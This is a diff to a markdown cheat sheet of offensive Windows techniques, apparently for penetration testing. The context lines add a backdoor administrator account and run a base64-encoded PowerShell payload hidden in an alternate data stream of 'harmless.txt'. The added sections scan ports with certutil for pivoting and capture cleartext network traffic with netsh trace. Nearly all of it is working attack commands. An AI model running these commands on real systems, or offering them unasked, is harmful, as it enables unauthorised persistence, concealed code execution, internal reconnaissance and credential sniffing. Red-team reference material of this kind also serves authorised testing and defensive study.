@@ -494,3 +494,33 @@ Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
 ```powershell
 powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
 ```
+
+## TCP port scanning using certutil
+
+This technique can be used when pivoting.  The error code indicates the status of the remote service.<br />
+The target being scanned in this example is 10.1.2.3 port 8080.
+
+`certutil -urlcache -split -f http://10.1.2.3:8080/doesnotexist.file doesnotexist.file | findstr FAILED`<br />
+Response `0x80072f78` the port responded but is not HTTP protocol.<br />
+Response `0x80190194` the port responded to HTTP but `doesnotexist.file` is not present (404 error).<br />
+Response `0x80072efd` the port did not respond.<br />
+Response does not contain an error code, then the file was retrieved successfully.
+
+## Using netsh to capture network packets
+
+This technique is useful for capturing insecure protocol traffic on a host (e.g. telnet, FTP, HTTP, SNMP).<br />
+This example will filter the trace on IP address 10.2.5.92 and halt after 10MB is captured.
+
+**Stop any currently running captures**<br />
+`netsh trace stop`
+
+**Start the packet capture**<br />
+`netsh trace start capture=yes ipv4.address=10.2.5.92 filemode=single maxsize=10 overwrite=yes tracefile=c:\Windows\temp\tracefile.etl`
+
+**Convert the etl file to cap format for wireshark**<br />
+Download Microsoft Network Monitor 3.4 from [HERE](https://www.microsoft.com/en-us/download/details.aspx?id=4865).<br />
+Open `tracefile.etl` with Network Monitor 3.4 and save as `tracefile.cap`.<br />
+Open `tracefile.cap` using wireshark.
+
+
+
